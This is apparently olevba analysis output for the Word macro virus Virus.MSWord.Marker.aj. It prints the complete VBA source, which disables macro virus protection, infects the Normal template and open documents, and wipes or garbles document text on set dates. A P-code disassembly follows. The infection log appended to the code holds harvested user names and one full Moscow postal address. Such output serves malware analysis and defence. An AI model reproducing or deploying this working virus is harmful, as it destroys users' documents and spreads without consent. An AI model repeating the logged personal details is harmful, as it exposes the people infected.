olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.aj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.aj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub
' 02:01:14 PM - Sunday, 16 May 1999
' USER5
'



' 10:14:21 AM - Monday, 17 May 1999
' Neelam Darne
'



' 07:14:45 PM - Wednesday, 2 Jun 1999
' Mitesh Sanghani
'



' 04:00:44 PM - Saturday, 5 Jun 1999
' xxx
'



' 04:56:42 PM - Monday, 28 Jun 1999
' Vijay
'



' 01:17:02 PM - Thursday, 1 Jul 1999
' ASIT
'



' 09:11:57 PM - Monday, 12 Jul 1999
' nics
' jtjeetjetuet
' ttjiotiotto
' erltjktjkrt



' 09:05:43 PM - Wednesday, 11 Aug 1999
' nics
' jtjeetjetuet
' ttjiotiotto
' erltjktjkrt



' 05:24:44 PM - Monday, 23 Aug 1999
' Marketing
'



' 05:28:31 PM - Thursday, 2 Sep 1999
' /;p
'



' 02:25:58  - вторник, 21 сен 1999
' Naren Apte
'



' 12:59:08  - пятница, 1 окт 1999
' SHV
'



' 11:53:16  - понедельник, 18 окт 1999
' SHV
'



' 12:23:09  - среда, 3 ноя 1999
' Elena Tabunschikova
'



' 09:48:22 AM - среда, 1 авг 2001
' Макиенко
' Россия,115487,Москва,
' ул.Нагатинская,д.16-а,
' ООО "АИР-ХХ1"
' ---------------------------------
' Макиенко А.И.



' 09:10:52  - пятница, 21 сен 2001
' Name
'



' 11:44:55  - пятница, 12 окт 2001
' Name
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.aj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11891 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #4:
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn OldMarker
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0009 "WebMaster"
' 	VarDefn Marker
' Line #7:
' Line #8:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #10:
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #13:
' Line #14:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #15:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #16:
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #18:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #19:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #20:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #22:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #23:
' 	LitStr 0x0008 "Webdings"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #24:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	QuoteRem 0x0004 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #28:
' 	LineCont 0x0008 0B 00 08 00 12 00 08 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' Line #30:
' Line #31:
' 	QuoteRem 0x0008 0x0019 "Infect the NormalTemplate"
' Line #32:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' Line #34:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #35:
' Line #36:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #37:
' Line #38:
' 	QuoteRem 0x000C 0x0031 "Write a log file of this NormalTemplate infection"
' Line #39:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #40:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' Line #49:
' 	LineCont 0x0010 09 00 16 00 12 00 16 00 1E 00 16 00 29 00 16 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #50:
' Line #51:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #52:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' Line #54:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' 	QuoteRem 0x0008 0x0019 "Infect the ActiveDocument"
' Line #60:
' 	LineCont 0x0008 05 00 0C 00 13 00 0D 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #61:
' Line #62:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #63:
' Line #64:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #65:
' Line #66:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #67:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #68:
' Line #69:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #70:
' Line #71:
' 	EndIfBlock 
' Line #72:
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Private Sub Document_Open())
' Line #77:
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #79:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #80:
' Line #81:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn OldMarker
' Line #82:
' 	Dim (Const) 
' 	LitStr 0x0009 "WebMaster"
' 	VarDefn Marker
' Line #83:
' Line #84:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #85:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #86:
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #88:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #89:
' Line #90:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #91:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #92:
' Line #93:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #94:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #95:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #96:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #97:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #98:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #99:
' 	LitStr 0x0008 "Webdings"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #100:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #101:
' 	EndIfBlock 
' Line #102:
' Line #103:
' 	QuoteRem 0x0004 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #104:
' 	LineCont 0x0008 0B 00 08 00 12 00 08 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #105:
' Line #106:
' Line #107:
' 	QuoteRem 0x0008 0x0019 "Infect the NormalTemplate"
' Line #108:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #109:
' Line #110:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #111:
' Line #112:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #113:
' Line #114:
' 	QuoteRem 0x000C 0x0031 "Write a log file of this NormalTemplate infection"
' Line #115:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #116:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #117:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #118:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	ElseBlock 
' Line #121:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' Line #125:
' 	LineCont 0x0010 09 00 16 00 12 00 16 00 1E 00 16 00 29 00 16 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #126:
' Line #127:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #128:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #129:
' Line #130:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #131:
' Line #132:
' 	EndIfBlock 
' Line #133:
' Line #134:
' Line #135:
' 	QuoteRem 0x0008 0x0019 "Infect the ActiveDocument"
' Line #136:
' 	LineCont 0x0008 05 00 0C 00 13 00 0D 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #137:
' Line #138:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #139:
' Line #140:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #141:
' Line #142:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #143:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #144:
' Line #145:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #146:
' Line #147:
' 	EndIfBlock 
' Line #148:
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	EndSub 
' Line #151:
' 	QuoteRem 0x0000 0x0022 " 02:01:14 PM - Sunday, 16 May 1999"
' Line #152:
' 	QuoteRem 0x0000 0x0006 " USER5"
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0022 " 10:14:21 AM - Monday, 17 May 1999"
' Line #158:
' 	QuoteRem 0x0000 0x000D " Neelam Darne"
' Line #159:
' 	QuoteRem 0x0000 0x0000 ""
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' 	QuoteRem 0x0000 0x0024 " 07:14:45 PM - Wednesday, 2 Jun 1999"
' Line #164:
' 	QuoteRem 0x0000 0x0010 " Mitesh Sanghani"
' Line #165:
' 	QuoteRem 0x0000 0x0000 ""
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x0023 " 04:00:44 PM - Saturday, 5 Jun 1999"
' Line #170:
' 	QuoteRem 0x0000 0x0004 " xxx"
' Line #171:
' 	QuoteRem 0x0000 0x0000 ""
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0022 " 04:56:42 PM - Monday, 28 Jun 1999"
' Line #176:
' 	QuoteRem 0x0000 0x0006 " Vijay"
' Line #177:
' 	QuoteRem 0x0000 0x0000 ""
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' 	QuoteRem 0x0000 0x0023 " 01:17:02 PM - Thursday, 1 Jul 1999"
' Line #182:
' 	QuoteRem 0x0000 0x0005 " ASIT"
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x0022 " 09:11:57 PM - Monday, 12 Jul 1999"
' Line #188:
' 	QuoteRem 0x0000 0x0005 " nics"
' Line #189:
' 	QuoteRem 0x0000 0x000D " jtjeetjetuet"
' Line #190:
' 	QuoteRem 0x0000 0x000C " ttjiotiotto"
' Line #191:
' 	QuoteRem 0x0000 0x000C " erltjktjkrt"
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0025 " 09:05:43 PM - Wednesday, 11 Aug 1999"
' Line #196:
' 	QuoteRem 0x0000 0x0005 " nics"
' Line #197:
' 	QuoteRem 0x0000 0x000D " jtjeetjetuet"
' Line #198:
' 	QuoteRem 0x0000 0x000C " ttjiotiotto"
' Line #199:
' 	QuoteRem 0x0000 0x000C " erltjktjkrt"
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x0022 " 05:24:44 PM - Monday, 23 Aug 1999"
' Line #204:
' 	QuoteRem 0x0000 0x000A " Marketing"
' Line #205:
' 	QuoteRem 0x0000 0x0000 ""
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x0023 " 05:28:31 PM - Thursday, 2 Sep 1999"
' Line #210:
' 	QuoteRem 0x0000 0x0004 " /;p"
' Line #211:
' 	QuoteRem 0x0000 0x0000 ""
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' 	QuoteRem 0x0000 0x0021 " 02:25:58  - вторник, 21 сен 1999"
' Line #216:
' 	QuoteRem 0x0000 0x000B " Naren Apte"
' Line #217:
' 	QuoteRem 0x0000 0x0000 ""
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' 	QuoteRem 0x0000 0x0020 " 12:59:08  - пятница, 1 окт 1999"
' Line #222:
' 	QuoteRem 0x0000 0x0004 " SHV"
' Line #223:
' 	QuoteRem 0x0000 0x0000 ""
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' 	QuoteRem 0x0000 0x0025 " 11:53:16  - понедельник, 18 окт 1999"
' Line #228:
' 	QuoteRem 0x0000 0x0004 " SHV"
' Line #229:
' 	QuoteRem 0x0000 0x0000 ""
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' 	QuoteRem 0x0000 0x001E " 12:23:09  - среда, 3 ноя 1999"
' Line #234:
' 	QuoteRem 0x0000 0x0014 " Elena Tabunschikova"
' Line #235:
' 	QuoteRem 0x0000 0x0000 ""
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' 	QuoteRem 0x0000 0x0020 " 09:48:22 AM - среда, 1 авг 2001"
' Line #240:
' 	QuoteRem 0x0000 0x0009 " Макиенко"
' Line #241:
' 	QuoteRem 0x0000 0x0016 " Россия,115487,Москва,"
' Line #242:
' 	QuoteRem 0x0000 0x0017 " ул.Нагатинская,д.16-а,"
' Line #243:
' 	QuoteRem 0x0000 0x000E " ООО "АИР-ХХ1""
' Line #244:
' 	QuoteRem 0x0000 0x0022 " ---------------------------------"
' Line #245:
' 	QuoteRem 0x0000 0x000E " Макиенко А.И."
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' 	QuoteRem 0x0000 0x0021 " 09:10:52  - пятница, 21 сен 2001"
' Line #250:
' 	QuoteRem 0x0000 0x0005 " Name"
' Line #251:
